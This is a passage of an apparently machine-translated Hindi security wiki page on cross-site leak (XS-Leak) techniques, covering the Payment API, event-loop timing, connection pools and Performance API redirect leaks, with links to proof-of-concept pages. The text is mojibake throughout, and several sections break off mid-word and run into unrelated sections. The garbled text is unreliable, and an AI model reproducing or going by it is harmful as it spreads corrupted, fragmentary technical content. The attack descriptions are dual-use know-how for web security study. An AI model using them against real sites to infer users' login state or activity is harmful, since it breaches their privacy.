рдХреНрд░рд┐рдпрд╛ рдПрдХ **рдСрд░реЗрдХрд▓** рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░ рд╕рдХрддреА рд╣реИ; рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреБрдЫ рд╕рдВрджреЗрд╢ рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреЗрдЬреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд▓реЙрдЧ рдЗрди рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдЗрди рд╕рдВрджреЗрд╢реЛрдВ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдпрд╛ рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдпрд╛ рдкрд╣рдЪрд╛рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рд╡реЗ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд┐рд╢реНрд╡ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## рд╡реИрд╢реНрд╡рд┐рдХ рд╕реАрдорд╛рдПрдВ рддрдХрдиреАрдХреЗрдВ

### WebSocket API

* **рд╕рдорд╛рд╡реЗрд╢рди
### рднреБрдЧрддрд╛рди API

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо, рдкреЙрдк-рдЕрдк
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЕрдВрддрд░**: API рдЙрдкрдпреЛрдЧ
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **рд╕рд╛рд░рд╛рдВрд╢**: рдХреЗрд╡рд▓ рдПрдХ рд╕рдордп рдореЗрдВ рдХреЗрд╡рд▓ рдПрдХ рднреБрдЧрддрд╛рди рдЕрдиреБрд░реЛрдз рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

рдпрд╣ XS-Leak рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдкрд╣рдЪрд╛рдирдиреЗ рдХреА рд╕рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрдм рдХреНрд░реЙрд╕-рд╕рдВрд╕реНрдерд╛рдирд┐рдХ рдкреГрд╖реНрда рдПрдХ рднреБрдЧрддрд╛рди рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рд░рдВрдн рдХрд░рддрд╛ рд╣реИ**ред

рдХреНрдпреЛрдВрдХрд┐ **рдХреЗрд╡рд▓ рдПрдХ рдЕрдиреБрд░реЛрдз рднреБрдЧрддрд╛рди рдПрдХ рд╕рдордп рдореЗрдВ рд╕рдХреНрд░рд┐рдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**, рдпрджрд┐ рд▓рдХреНрд╖реНрдп рд╕рд╛рдЗрдЯ рднреБрдЧрддрд╛рди рдЕрдиреБрд░реЛрдз API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдХрд┐рд╕реА рднреА **рдЖрдЧреЗ рдХреА рдХреЛрд╢рд┐рд╢реЗрдВ рдЗрд╕ рдПрдкреАрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓ рд╣реЛрдВрдЧреА**, рдФрд░ рдПрдХ **рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдкрд╡рд╛рдж** рдХрд╛ рдХрд╛рд░рдг рдмрдиреЗрдВрдЧреАред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЗрд╕ рджреНрд╡рд╛рд░рд╛ **рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рд╕реЗ рднреБрдЧрддрд╛рди рдПрдкреАрдЖрдИ рдпреВрдЖрдИ рджрд┐рдЦрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛**ред рдпрджрд┐ рдХрд┐рд╕реА рдкреНрд░рдпрд╛рд╕ рд╕реЗ рдПрдХ рдЕрдкрд╡рд╛рдж рдХрд╛ рдХрд╛рд░рдг рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд▓рдХреНрд╖реНрдп рд╕рд╛рдЗрдЯ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЗрди рдирд┐рдпрдорд┐рдд рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рдЫреБрдкрд╛ рд╕рдХрддрд╛ рд╣реИ рддреБрд░рдВрдд рдЙрддреНрдкрд╛рджрди рдХреЗ рдмрд╛рдж рдпреВрдЖрдИ рдмрдВрдж рдХрд░рдХреЗред

### рдШрдбрд╝реА рдХрд╛ рдШрдЯрдирд╛ рд▓реВрдк <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**:
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдПрдХ рд╡реЗрдм рдХреЗ рдПрдХрд▓-рд╕реВрддреНрд░рд┐рдд JS рдШрдЯрдирд╛ рд▓реВрдк рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдорд╛рдкреЗрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ [рдПрдХрд▓-рд╕реВрддреНрд░рд┐рдд рдШрдЯрдирд╛ рд▓реВрдк](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) рд╕рдорд╡рд╛рдп рдореЙрдбрд▓ рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рдХрд╛рд░реНрдп рдХреЛ рдПрдХ рд╕рдордп рдореЗрдВ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ рдЕрдиреНрдп рд╕реНрд░реЛрдд рд╕реЗ рдХреЛрдб рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ, рдХреЛ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдирд┐рд╢реНрдЪрд┐рдд рдЧреБрдгрд╡рддреНрддрд╛ рд╡рд╛рд▓реЗ рдШрдЯрдирд╛рдУрдВ рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдорд╛рдк рд╕рдХрддрд╛ рд╣реИ рдШрдЯрдирд╛ рд▓реВрдк рдХреЗ рдЕрдкрдиреЗ рдХреЛрдб рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдорд╛рдкрдХрд░ рдирд┐рд░рдВрддрд░ рдШрдЯрдирд╛рдПрдВ рдбрд┐рд╕реНрдкреИрдЪ рдХрд░рдХреЗред рдпреЗ рдШрдЯрдирд╛рдПрдВ рдЬрдм рдШрдЯрдирд╛ рдкреВрд▓ рдЦрд╛рд▓реА рд╣реЛрддрд╛ рд╣реИ рддреЛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рд╣реЛрдВрдЧреАред рдпрджрд┐ рдЕрдиреНрдп рд╕реНрд░реЛрдд рднреА рдПрдХ рд╣реА рдкреВрд▓ рдореЗрдВ рдШрдЯрдирд╛рдПрдВ рдбрд┐рд╕реНрдкреИрдЪ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ **рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рджреЗрд░реА рдХреЗ рдЕрд╡рд▓реЛрдХрди рд╕реЗ рдЙрди рдмрд╛рд╣реНрдп рдШрдЯрдирд╛рдУрдВ рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдХреЛ рдЕрдВрдХрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рджреЗрд░реА рдХреЗ рд▓рд┐рдП рдШрдЯрдирд╛ рд▓реВрдк рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдХрд╛ рдпрд╣ рддрд░реАрдХрд╛ рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдХреЛрдб рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдХреЛ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред

{% hint style="warning" %}
рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдореЗрдВ **рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛рд░рдХреЛрдВ** рдХреЛ **рдирд┐рдХрд╛рд▓рдирд╛** рдФрд░ **рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдорд╛рдк** рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреГрд╖реНрда рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗред
{% endhint %}

### рд╡реНрдпрд╕реНрдд рдШрдЯрдирд╛ рд▓реВрдк <a href="#busy-event-loop" id="busy-event-loop"></a>

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**:
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдПрдХ рд╡реЗрдм рдХреЗ рдХрд╛рд░реНрдп рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдПрдХ рдзрд╛рдЧреЗ рдХреЗ рдШрдЯрдирд╛ рд▓реВрдк рдХреЛ рдЬрд╛рдирдмреВрдЭрдХрд░ рдмреНрд▓реЙрдХ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд╕рдордп рдХрд╛ рдЕрдВрдХрдЧрдгрд┐рдд рдХрд░рдирд╛ рд╣реИ **рдШрдЯрдирд╛ рд▓реВрдк рдХреЛ рдлрд┐рд░ рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ**ред рдПрдХ рдмреНрд▓реЙрдХ рдХрд╛рд░реНрдп (рдЬреИрд╕реЗ рдПрдХ рд▓рдВрдмреА рдЧрдгрдирд╛ рдпрд╛ рдПрдХ рд╕рдордХрд╛рд▓рд┐рдХ API рдХреЙрд▓) рдХреЛ рдШрдЯрдирд╛ рд▓реВрдк рдореЗрдВ рдбрд╛рд▓рдХрд░ рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдХреЛрдб рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреЗ рд▓рд┐рдП рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ рдЙрд╕реЗ рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдХреЗ, рдХрд┐рд╕реА рднреА рджреМрд░рд╛рди рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдмреНрд▓реЙрдХрд┐рдВрдЧ рдЕрд╡рдзрд┐ рдХреЗ рджреМрд░рд╛рди рдШрдЯрдирд╛ рд▓реВрдк рдореЗрдВ рдХрд┐рддрдиреЗ рдХрд╛рд░реНрдп рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд░рд╣реЗ рдереЗред рдпрд╣ рддрдХрдиреАрдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдПрдХрд▓-рд╕реВрддреНрд░рд┐рдд рдкреНрд░рдХреГрддрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреА рд╣реИ, рдЬрд╣рд╛рдВ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЕрдиреБрдХреНрд░рдорд┐рдХ рд░реВрдк рд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдПрдХ рд╣реА рдзрд╛рдЧрд╛ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреНрдп рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдкреНрд░рджрд░реНрд╢рди рдпрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдВрджрд░реВрдиреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

рдШрдЯрдирд╛ рд▓реВрдк рдХреЛ рдмрдВрдж рдХрд░рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреА рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд▓рд╛рдн рд╣реИ рдХрд┐ рдпрд╣ **рд╕рд╛рдЗрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди** рдХреЛ рдЯрд╛рд▓рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред **рд╕рд╛рдЗрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╕рд╛рдЗрдЯ рд╕реАрдзреЗ рдЕрдиреНрдп рд╕рд╛рдЗрдЯреЛрдВ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рд░реЛрдХреЗрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдЕрдиреНрдп рд╕реНрд░реЛрдд рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдХреЛ рд╕рд╛рдЭрд╛ рдШрдЯрдирд╛ рд▓реВрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рд╕реНрд░реЛрдд рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рдЕрдиреНрдп рд╕реНрд░реЛрдд рдХреЗ рдбреЗрдЯрд╛ рддрдХ рд╕реАрдзрд╛ рдкрд╣реБрдВрдЪрдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдирд╣реАрдВ рдХрд░рддреА рд╣реИ, рдмрд▓реНрдХрд┐ рдЙрд╕ рд╕реНрд░реЛрдд рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рдЭрд╛ рдШрдЯрдирд╛ рд▓реВрдк рдкрд░ рдкреНрд░рднрд╛рд╡ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░рддреА рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ **рд╕рд╛рдЗрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди** рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдкрд┐рдд рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХ рдмрд╛рдзрд╛рдУрдВ рд╕реЗ рдмрдЪрддреА рд╣реИред

{% hint style="warning" %}
рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдордп рдореЗрдВ **рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛рд░рдХреЛрдВ** рдХреЛ **рдирд┐рдХрд╛рд▓рдирд╛** рдФрд░ **рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдорд╛рдк** рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреГрд╖реНрда рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗред
{% endhint %}

### рдХрдиреЗрдХреНрд╢рди рдкреВрд▓

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдиреБрд░реЛрдз
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рднреА рд╕реЙрдХреЗрдЯреНрд╕ рдХреЛ рдмрдВрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХреЗрд╡рд▓ 1 рдХреЛ рдЫреЛ
## рдкреНрд░рджрд░реНрд╢рди API рддрдХрдиреАрдХ

[`рдкреНрд░рджрд░реНрд╢рди API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдкреНрд░рджрд░реНрд╢рди рдореИрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ [`рд╕рдВрд╕рд╛рдзрди рд╕рдордпрд╛рдВрдХрди API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) рджреНрд╡рд╛рд░рд╛ рдФрд░ рдЕрдзрд┐рдХ рд╕рдореГрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕рдВрд╕рд╛рдзрди рд╕рдордпрд╛рдВрдХрди API рд╡рд┐рд╕реНрддреГрдд рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рд╕рдордп рдХреА рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдмрдирд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рдЕрд╡рдзрд┐ред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЬрдм рд╕рд░реНрд╡рд░ `Timing-Allow-Origin: *` рд╣реЗрдбрд░ рдХреЛ рдЕрдкрдиреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдЖрдХрд╛рд░ рдФрд░ рдбреЛрдореЗрди рд▓реБрдХрдЕрдк рд╕рдордп рдЬреИрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдЙрдкрд▓рдмреНрдз рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рдбреЗрдЯрд╛ рд╕рдореГрджреНрдзрд┐ рдХреЛ [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) рдпрд╛ [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) рдЬреИрд╕реА рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдкреНрд░рджрд░реНрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рд╡реНрдпрд╛рдкрдХ рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, API рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╕рдордпрдЪрд┐рд╣реНрдиреЛрдВ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХреА рдЧрдгрдирд╛ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ Chrome рдЬреИрд╕реЗ рдХреБрдЫ рдСрдкрд░реЗрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП `performance.now()` рдХреА рдЕрдЪреНрдЫрд╛рдИ рдХреЗрд╡рд▓ рдорд┐рд▓реАрд╕реЗрдХрдВрдб рддрдХ рд╕реАрдорд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬреЛ рд╕рдордпрдЪрд┐рд╣реНрдиреЛрдВ рдХреА рд╡рд┐рд╕реНрддрд╛рд░рдг рдХреА рдирдХрд▓ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
### рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдкреНрд░рд╛рд░рдВрдн рд▓реАрдХ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **рд╕рд╛рд░рд╛рдВрд╢:** рд╕рдВрд╕рд╛рдзрди рд╕рдордпрд╛рдВрдХрди рдкреНрд░рд╡рд╛рд╣ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рдкреНрд░рд╛рд░рдВрдн рд╕рдордп рдХреЛ рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

